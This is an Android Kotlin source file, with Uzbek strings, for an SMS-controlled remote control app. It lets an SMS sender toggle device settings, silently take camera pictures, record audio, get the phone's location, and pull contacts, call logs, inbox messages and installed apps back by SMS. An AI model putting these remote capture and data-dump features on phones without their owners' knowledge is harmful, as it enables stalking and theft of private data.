package com.example.remotecontrol

import android.app.NotificationChannel
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.app.NotificationManager
import android.bluetooth.BluetoothAdapter
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.util.Calendar

open class CommandHandler(protected val context: Context) {

    companion object {
        const val TAG = "CommandHandler"
        private val lastCommandTime = mutableMapOf<String, Long>()

        fun isDuplicate(sender: String, command: String): Boolean {
            val key = "${sender}_${command}"
            val now = System.currentTimeMillis()
            val last = lastCommandTime[key] ?: 0L
            return if (now - last < 5000) {
                true
            } else {
                lastCommandTime[key] = now
                false
            }
        }
    }

    fun executeAndReturn(sender: String, command: String): String? {
        return when {
            command == "#battery" -> getBatteryInfo()
            command.startsWith("#volume:") -> { execute(sender, command); "Ovoz ${command.removePrefix("#volume:").trim()}% ga o'rnatildi" }
            command == "#wifi_on" -> { execute(sender, command); "WiFi yoqildi" }
            command == "#wifi_off" -> { execute(sender, command); "WiFi o'chirildi" }
            command == "#bluetooth_on" -> { execute(sender, command); "Bluetooth yoqildi" }
            command == "#bluetooth_off" -> { execute(sender, command); "Bluetooth o'chirildi" }
            command == "#screen_off" -> { execute(sender, command); null }
            command == "#screen_on" -> { execute(sender, command); null }
            else -> { execute(sender, command); null }
        }
    }

    fun execute(sender: String, command: String) {
        if (isDuplicate(sender, command)) { Log.w(TAG, "Duplicate o'tkazib yuborildi: $command"); return }
        Log.d(TAG, "Buyruq: $command")
        when {
            command.startsWith("#call:") -> makeCall(command.removePrefix("#call:").trim())
            command.startsWith("#sms:") -> {
                val parts = command.removePrefix("#sms:").split(":", limit = 2)
                if (parts.size == 2) sendSms(parts[0].trim(), parts[1].trim())
            }
            command == "#flash_on"  -> { setFlash(true); sendSms(sender, "🔦 Chiroq yoqildi!") }
            command == "#flash_off" -> { setFlash(false); sendSms(sender, "Chiroq o'chirildi") }
            command.startsWith("#volume:") -> setVolume(command.removePrefix("#volume:").trim().toIntOrNull() ?: 50)
            command == "#mute"   -> setVolume(0)
            command == "#unmute" -> setVolume(80)
            command == "#battery" -> sendSms(sender, getBatteryInfo())
            command == "#stop_audio" -> {
                // AudioPlayerService ni to'xtatish
                context.startService(Intent(context, AudioPlayerService::class.java).apply { action = "STOP" })
                // YouTube/media ni to'xtatish
                val audioManager = context.getSystemService(android.media.AudioManager::class.java)
                val keyEvent = android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, android.view.KeyEvent.KEYCODE_MEDIA_STOP)
                audioManager.dispatchMediaKeyEvent(keyEvent)
                val keyEvent2 = android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, android.view.KeyEvent.KEYCODE_MEDIA_PAUSE)
                audioManager.dispatchMediaKeyEvent(keyEvent2)
                sendSms(sender, "⏹ To'xtatildi")
            }
            command == "#pause" -> {
                context.startService(Intent(context, AudioPlayerService::class.java).apply { action = "PAUSE" })
                val audioManager = context.getSystemService(android.media.AudioManager::class.java)
                val keyEvent = android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, android.view.KeyEvent.KEYCODE_MEDIA_PAUSE)
                audioManager.dispatchMediaKeyEvent(keyEvent)
                sendSms(sender, "⏸ Pauza")
            }
            command == "#resume_audio" -> {
                context.startService(Intent(context, AudioPlayerService::class.java).apply { action = "RESUME" })
                val audioManager = context.getSystemService(android.media.AudioManager::class.java)
                val keyEvent = android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, android.view.KeyEvent.KEYCODE_MEDIA_PLAY)
                audioManager.dispatchMediaKeyEvent(keyEvent)
                sendSms(sender, "▶️ Davom etmoqda")
            }
            command == "#location" -> {
                context.startService(Intent(context, LocationService::class.java).putExtra("reply_to", sender))
            }
            command == "#take_picture" -> {
                android.util.Log.d("CommandHandler", "take_picture buyrug'i: sender=$sender")
                val i = Intent(context, CameraService::class.java).apply {
                    putExtra("reply_to", sender)
                    putExtra("camera", "back")
                }
                context.startService(i)
                android.util.Log.d("CommandHandler", "CameraService ishga tushirildi")
            }
            command == "#take_front_pic" -> {
                val i = Intent(context, CameraService::class.java).apply {
                    putExtra("reply_to", sender)
                    putExtra("camera", "front")
                }
                context.startService(i)
            }
            command.startsWith("#record_audio:") -> {
                val seconds = command.removePrefix("#record_audio:").trim().toIntOrNull() ?: 30
                context.startService(Intent(context, AudioRecordService::class.java)
                    .putExtra("reply_to", sender).putExtra("seconds", seconds))
            }
            command == "#media_play" -> mediaControl(true)
            command == "#media_stop" -> mediaControl(false)
            command == "#wifi_on"  -> setWifi(true, sender)
            command == "#wifi_off" -> setWifi(false, sender)
            command == "#bluetooth_on"  -> setBluetooth(true, sender)
            command == "#bluetooth_off" -> setBluetooth(false, sender)
            command == "#vibrate" -> vibrate()
            command == "#screen_on"  -> wakeScreen()
            command == "#screen_off" -> screenOff(sender)
            command.startsWith("#brightness:") -> setBrightness(command.removePrefix("#brightness:").trim().toIntOrNull() ?: 50, sender)
            command == "#shutdown"   -> shutdownDevice(sender)
            command == "#reboot"  -> rebootDevice(sender)
            command.startsWith("#ringtone:") -> setRingtoneVolume(command.removePrefix("#ringtone:").trim().toIntOrNull() ?: 50)
            command == "#device_info"  -> sendSms(sender, getDeviceInfo())
            command == "#network_info" -> sendSms(sender, getNetworkInfo())
            command == "#contacts" -> sendSms(sender, getContacts())
            command.startsWith("#contacts_") && command.removePrefix("#contacts_").length == 1 -> {
                val letter = command.removePrefix("#contacts_").trim().uppercase()
                sendContactsByLetter(sender, letter)
            }
            command == "#call_log"       -> sendSms(sender, getCallLog())
            command == "#sms_list"       -> sendSms(sender, getSmsList())
            command == "#installed_apps" -> sendSms(sender, getInstalledApps())
            command.startsWith("#block:") -> {
                val number = command.removePrefix("#block:").trim()
                SecurityManager.blockNumber(context, number)
                sendSms(sender, "Bloklandi: $number")
            }
            command.startsWith("#unblock:") -> {
                val number = command.removePrefix("#unblock:").trim()
                SecurityManager.unblockNumber(context, number)
                sendSms(sender, "Blokdan chiqarildi: $number")
            }
            command == "#list_blocked" -> {
                val numbers = SecurityManager.getBlockedNumbers(context)
                sendSms(sender, "Bloklangan:\n${if (numbers.isEmpty()) "Yo'q" else numbers.joinToString("\n")}")
            }
            command.startsWith("#set_password:") -> {
                val newPass = command.removePrefix("#set_password:").trim()
                if (newPass.length == 4 && newPass.all { it.isDigit() }) {
                    SecurityManager.setPassword(context, newPass)
                    sendSms(sender, "Parol o'rnatildi.")
                } else {
                    sendSms(sender, "Parol 4 ta raqam bo'lishi kerak!")
                }
            }
            command == "#remove_password" -> {
                SecurityManager.setPassword(context, "")
                sendSms(sender, "Parol o'chirildi.")
            }
            command == "#ping" -> sendSms(sender, "Pong! Qurilma ishlayapti.")
            command.startsWith("#alarm:") -> setAlarm(command.removePrefix("#alarm:").trim(), sender)
            command.startsWith("#notify:") -> showNotification(command.removePrefix("#notify:").trim())
            command.startsWith("#sos:") -> sendSos(command.removePrefix("#sos:").trim(), sender)
            command.startsWith("#open_app:") -> openApp(command.removePrefix("#open_app:").trim(), sender)
            command.startsWith("#show_text:") -> showText(command.removePrefix("#show_text:").trim(), sender)
            command == "#gps_on" -> toggleGps(true, sender)
            command == "#gps_off" -> toggleGps(false, sender)
            command == "#mobile_data_settings" -> openMobileDataSettings(sender)
            command == "#mobile_on" -> setMobileData(true, sender)
            command == "#mobile_off" -> setMobileData(false, sender)
            else -> {
                Log.w(TAG, "Noma'lum: $command")
                sendSms(sender, "Noma'lum buyruq: $command")
            }
        }
    }

    private fun toggleGps(enable: Boolean, sender: String) {
        try {
            val mode = if (enable) 3 else 0
            android.provider.Settings.Secure.putInt(
                context.contentResolver,
                android.provider.Settings.Secure.LOCATION_MODE,
                mode
            )
            sendSms(sender, "📍 GPS ${if (enable) "yoqildi ✅" else "o'chirildi ✅"}")
        } catch (e: Exception) {
            sendSms(sender, "⚠️ GPS xato: ${e.message?.take(60)}")
        }
    }

    private fun setMobileData(enable: Boolean, sender: String) {
        Thread {
            try {
                val arg = if (enable) "enable" else "disable"
                val process = Runtime.getRuntime().exec(arrayOf("/system/bin/svc", "data", arg))
                val exit = process.waitFor()
                val err = process.errorStream.bufferedReader().readText()
                val out = process.inputStream.bufferedReader().readText()
                android.util.Log.d("MobileData", "exit=$exit out=$out err=$err")
                sendSms(sender, "📱 Mobil internet ${if (enable) "yoqildi ✅" else "o'chirildi ✅"}")
            } catch (e: Exception) {
                android.util.Log.e("MobileData", "xato: ${e.message}")
                sendSms(sender, "Mobile xato: ${e.message?.take(40)}")
            }
        }.start()
    }

    private fun openMobileDataSettings(sender: String) {
        try {
            val intent = Intent(android.provider.Settings.ACTION_DATA_ROAMING_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            sendSms(sender, "📱 Mobil internet sozlamalari ochildi")
        } catch (e: Exception) {
            try {
                val intent = Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(intent)
                sendSms(sender, "📱 Tarmoq sozlamalari ochildi")
            } catch (e2: Exception) {
                sendSms(sender, "⚠️ Sozlamalar ochilmadi: ${e2.message?.take(30)}")
            }
        }
    }

    private fun showText(text: String, sender: String) {
        try {
            val intent = Intent(context, OverlayMediaActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("display_text", text)
            }
            context.startActivity(intent)
            sendSms(sender, "💬 Xabar ekranda ko'rsatilmoqda!")
        } catch (e: Exception) {
            sendSms(sender, "⚠️ Xato: ${e.message?.take(40)}")
        }
    }

    private fun openApp(appName: String, sender: String) {
        try {
            val pm = context.packageManager
            val knownApps = mapOf(
                "telegram" to "org.telegram.messenger",
                "whatsapp" to "com.whatsapp",
                "instagram" to "com.instagram.android",
                "youtube" to "com.google.android.youtube",
                "maps" to "com.google.android.apps.maps",
                "xarita" to "com.google.android.apps.maps",
                "settings" to "com.android.settings",
                "sozlamalar" to "com.android.settings",
                "chrome" to "com.android.chrome",
                "gmail" to "com.google.android.gm",
                "calculator" to "com.android.calculator2",
                "kalkulyator" to "com.android.calculator2",
                "calendar" to "com.google.android.calendar",
                "taqvim" to "com.google.android.calendar",
                "clock" to "com.android.deskclock",
                "soat" to "com.android.deskclock",
                "spotify" to "com.spotify.music",
                "facebook" to "com.facebook.katana",
                "tiktok" to "com.zhiliaoapp.musically",
                "discord" to "com.discord",
                "netflix" to "com.netflix.mediaclient",
                "playstore" to "com.android.vending",
                "contacts" to "com.android.contacts",
                "kontaktlar" to "com.android.contacts",
                "phone" to "com.android.dialer",
                "telefon" to "com.android.dialer",
                "gallery" to "com.miui.gallery",
                "galereya" to "com.miui.gallery"
            )
            val nameLower = appName.lowercase().trim()
            val packageName = knownApps[nameLower] ?: run {
                val allApps = pm.getInstalledApplications(0)
                allApps.firstOrNull {
                    it.packageName.contains(nameLower, ignoreCase = true) ||
                    pm.getApplicationLabel(it).toString().contains(nameLower, ignoreCase = true)
                }?.packageName
            }
            if (packageName != null) {
                val intent = pm.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    sendSms(sender, "📱 ${appName.replaceFirstChar { it.uppercase() }} ochildi!")
                } else {
                    sendSms(sender, "⚠️ $appName ochib bo'lmadi")
                }
            } else {
                sendSms(sender, "❓ '$appName' topilmadi")
            }
        } catch (e: Exception) {
            sendSms(sender, "⚠️ Xato: ${e.message?.take(40)}")
        }
    }

    private fun makeCall(number: String) {
        try {
            val intent = Intent(context, CallActivity::class.java).apply {
                putExtra("number", number)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) { Log.e(TAG, "Call xato: ${e.message}") }
    }

    open fun sendSms(number: String, message: String) {
        try {
            // Oxirgi yuborilgan SMSni saqlaymiz
            context.getSharedPreferences("sms_sent_track", android.content.Context.MODE_PRIVATE)
                .edit().putString("last_sent_to_${number.filter{it.isDigit()}.takeLast(9)}", message.trim()).apply()
            SentSmsTracker.track(number)
            val savedSubId = context.getSharedPreferences("rc_settings", android.content.Context.MODE_PRIVATE)
                .getInt("sim_subscription_id", -1)
            val smsManager = if (savedSubId != -1) {
                SmsManager.getSmsManagerForSubscriptionId(savedSubId)
            } else {
                val defaultSubId = android.telephony.SubscriptionManager.getDefaultSmsSubscriptionId()
                if (defaultSubId != android.telephony.SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                    SmsManager.getSmsManagerForSubscriptionId(defaultSubId)
                } else {
                    SmsManager.getDefault()
                }
            }
            smsManager.sendMultipartTextMessage(number, null, smsManager.divideMessage(message), null, null)
        } catch (e: Exception) { Log.e(TAG, "SMS xato: ${e.message}") }
    }

    private fun setFlash(enable: Boolean) {
        try {
            val cam = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            cam.setTorchMode(cam.cameraIdList[0], enable)
        } catch (e: Exception) { Log.e(TAG, "Flash xato: ${e.message}") }
    }

    private fun setVolume(level: Int) {
        try {
            val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val max = audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audio.setStreamVolume(AudioManager.STREAM_MUSIC, level.coerceIn(0, 100) * max / 100, 0)
        } catch (e: Exception) { Log.e(TAG, "Volume xato: ${e.message}") }
    }

    internal fun getBatteryInfo(): String {
        return try {
            val b = context.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = b?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = b?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val percent = if (scale > 0) (level * 100 / scale) else -1
            val status = b?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            "Batareya: $percent% | ${if (charging) "Zaryadlanmoqda" else "Zaryadlanmayapti"}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun setWifi(enable: Boolean, sender: String) {
        Thread {
            try {
                val arg = if (enable) "enable" else "disable"
                val process = Runtime.getRuntime().exec(arrayOf("/system/bin/svc", "wifi", arg))
                val exit = process.waitFor()
                val err = process.errorStream.bufferedReader().readText()
                val out = process.inputStream.bufferedReader().readText()
                android.util.Log.d("WiFiCmd", "exit=$exit out=$out err=$err")
                sendSms(sender, "📶 WiFi ${if (enable) "yoqildi ✅" else "o'chirildi ✅"}")
            } catch (e: Exception) {
                android.util.Log.e("WiFiCmd", "xato: ${e.message}")
                sendSms(sender, "WiFi xato: ${e.message?.take(40)}")
            }
        }.start()
    }

    private fun setBluetooth(enable: Boolean, sender: String) {
        Thread {
            try {
                val process = Runtime.getRuntime().exec(arrayOf(
                    "cmd", "bluetooth_manager", if (enable) "enable" else "disable"
                ))
                val exit = process.waitFor()
                val err = process.errorStream.bufferedReader().readText()
                android.util.Log.d("BTCmd", "exit=$exit err=$err")
                if (exit == 0) sendSms(sender, "🔵 Bluetooth ${if (enable) "yoqildi ✅" else "o'chirildi ✅"}")
                else sendSms(sender, "⚠️ Bluetooth xato: $err")
            } catch (e: Exception) {
                sendSms(sender, "BT xato: ${e.message?.take(40)}")
            }
        }.start()
    }

    private fun vibrate() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            }
        } catch (e: Exception) { Log.e(TAG, "Vibrate xato: ${e.message}") }
    }

    private fun rebootDevice(sender: String) {
        try {
            sendSms(sender, "Qurilma qayta ishga tushirilmoqda...")
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
        } catch (e: Exception) { sendSms(sender, "Reboot uchun root kerak.") }
    }

    private fun takeScreenshot(sender: String) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (!pm.isInteractive) {
            sendSms(sender, "Telefon ekrani o'chiq.")
            return
        }
        val i = Intent(context, ScreenshotActivity::class.java).apply {
            putExtra("reply_to", sender)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(i)
    }

    private fun setBrightness(level: Int, sender: String) {
        try {
            val clamped = level.coerceIn(0, 100)
            val systemValue = (clamped * 255 / 100)
            android.provider.Settings.System.putInt(
                context.contentResolver,
                android.provider.Settings.System.SCREEN_BRIGHTNESS,
                systemValue
            )
            // Auto brightness o'chirish
            android.provider.Settings.System.putInt(
                context.contentResolver,
                android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
            )
            sendSms(sender, "💡 Yorug'lik $clamped% ga o'rnatildi ✅")
        } catch (e: Exception) {
            sendSms(sender, "⚠️ Yorug'lik xato: ${e.message?.take(40)}")
        }
    }

    private fun screenOff(sender: String) {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                sendSms(sender, "Ekran o'chirildi.")
            } else {
                sendSms(sender, "Admin huquqi kerak. Ilovani oching va admin qiling.")
            }
        } catch (e: Exception) {
            sendSms(sender, "Ekran o'chirish xato: " + e.message)
        }
    }

    private fun shutdownDevice(sender: String) {
        try {
            sendSms(sender, "Telefon o'chirilmoqda...")
            Thread.sleep(2000)
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
        } catch (e: Exception) {
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(adminComponent)) {
                    dpm.lockNow()
                }
            } catch (e2: Exception) {
                Log.e(TAG, "Shutdown xato: " + e2.message)
            }
        }
    }

    private fun wakeScreen() {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "RemoteControl::WakeLock"
            )
            wl.acquire(3000)
        } catch (e: Exception) { Log.e(TAG, "Screen xato: ${e.message}") }
    }

    private fun setRingtoneVolume(level: Int) {
        try {
            val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val max = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
            audio.setStreamVolume(AudioManager.STREAM_RING, level.coerceIn(0, 100) * max / 100, 0)
        } catch (e: Exception) { Log.e(TAG, "Ringtone xato: ${e.message}") }
    }

    private fun getDeviceInfo(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nOperator: ${tm.networkOperatorName}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getNetworkInfo(): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ip = wm.connectionInfo.ipAddress
            val ipStr = "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            "IP: $ipStr\nSSID: ${wm.connectionInfo.ssid}\nOperator: ${tm.networkOperatorName}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getContacts(): String {
        return try {
            val sb = StringBuilder("Kontaktlar:\n")
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            var count = 0
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && count < 20) {
                    sb.append("${it.getString(nameIdx)}: ${it.getString(numIdx)}\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun sendContactsByLetter(sender: String, letter: String) {
        try {
            val contacts = mutableListOf<Pair<String, String>>()
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = it.getString(nameIdx) ?: continue
                    val number = it.getString(numIdx) ?: continue
                    if (name.uppercase().startsWith(letter)) {
                        contacts.add(Pair(name, number))
                    }
                }
            }

            if (contacts.isEmpty()) {
                sendSms(sender, "($letter) harfli kontakt topilmadi.")
                return
            }

            val total = contacts.size
            val chunkSize = 20
            val totalPages = (total + chunkSize - 1) / chunkSize

            contacts.chunked(chunkSize).forEachIndexed { pageIndex, chunk ->
                val sb = StringBuilder()
                if (pageIndex == 0) {
                    if (totalPages == 1) {
                        sb.append("👤 Kontaktlar ($letter) $total ta:\n")
                    } else {
                        sb.append("👤 Kontaktlar ($letter) $total ta (1/$totalPages):\n")
                    }
                } else {
                    sb.append("Kontaktlar ($letter) (${pageIndex + 1}/$totalPages):\n")
                }
                chunk.forEachIndexed { i, pair ->
                    val num = pageIndex * chunkSize + i + 1
                    sb.append("$num) ${pair.first}: ${pair.second}\n")
                }
                sendSms(sender, sb.toString().trimEnd())
                if (pageIndex < totalPages - 1) Thread.sleep(1500)
            }
        } catch (e: Exception) {
            sendSms(sender, "Xato: " + e.message)
        }
    }

    private fun getCallLog(): String {
        return try {
            val sb = StringBuilder("Qo'ng'iroqlar:\n")
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
            )
            var count = 0
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                while (it.moveToNext() && count < 10) {
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "Kiruvchi"
                        CallLog.Calls.OUTGOING_TYPE -> "Chiquvchi"
                        CallLog.Calls.MISSED_TYPE -> "O'tkazib yuborilgan"
                        else -> "?"
                    }
                    val date = java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.getDefault())
                        .format(java.util.Date(it.getLong(dateIdx)))
                    sb.append("$type: ${it.getString(numIdx)} — $date\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getSmsList(): String {
        return try {
            val sb = StringBuilder("Oxirgi SMSlar:\n")
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC"
            )
            var count = 0
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                while (it.moveToNext() && count < 5) {
                    val body = it.getString(bodyIdx)?.take(50) ?: ""
                    sb.append("${it.getString(addrIdx)}: $body\n---\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getInstalledApps(): String {
        return try {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(0)
                .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
                .map { pm.getApplicationLabel(it).toString() }
                .sorted().take(30)
            "Ilovalar:\n${apps.joinToString("\n")}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun mediaControl(play: Boolean) {
        try {
            val intent = Intent("com.android.music.musicservicecommand").apply {
                putExtra("command", if (play) "play" else "pause")
            }
            context.sendBroadcast(intent)
        } catch (e: Exception) { Log.e(TAG, "Media xato: ${e.message}") }
    }

    private fun setAlarm(time: String, sender: String) {
        try {
            val parts = time.split(":")
            if (parts.size != 2) { sendSms(sender, "Format: #alarm:HH:MM"); return }
            val intent = Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
                putExtra(android.provider.AlarmClock.EXTRA_HOUR, parts[0].toInt())
                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, parts[1].toInt())
                putExtra(android.provider.AlarmClock.EXTRA_SKIP_UI, true)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            sendSms(sender, "Signal o'rnatildi: $time")
        } catch (e: Exception) { sendSms(sender, "Alarm xato: ${e.message}") }
    }

    private fun showNotification(text: String) {
        try {
            val channelId = "rc_notify"
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(channelId, "RC Notify", NotificationManager.IMPORTANCE_HIGH))
            val notif = NotificationCompat.Builder(context, channelId)
                .setContentTitle("Remote Control")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()
            nm.notify(System.currentTimeMillis().toInt(), notif)
        } catch (e: Exception) { Log.e(TAG, "Notify xato: ${e.message}") }
    }

    private fun sendSos(sosNumber: String, sender: String) {
        try {
            sendSms(sender, "SOS yuborilmoqda: $sosNumber")
            context.startService(Intent(context, LocationService::class.java)
                .putExtra("reply_to", sosNumber).putExtra("sos_mode", true))
            sendSms(sosNumber, "SOS! Bu qurilma yordam so'ramoqda!")
            makeCall(sosNumber)
        } catch (e: Exception) { Log.e(TAG, "SOS xato: ${e.message}") }
    }
}
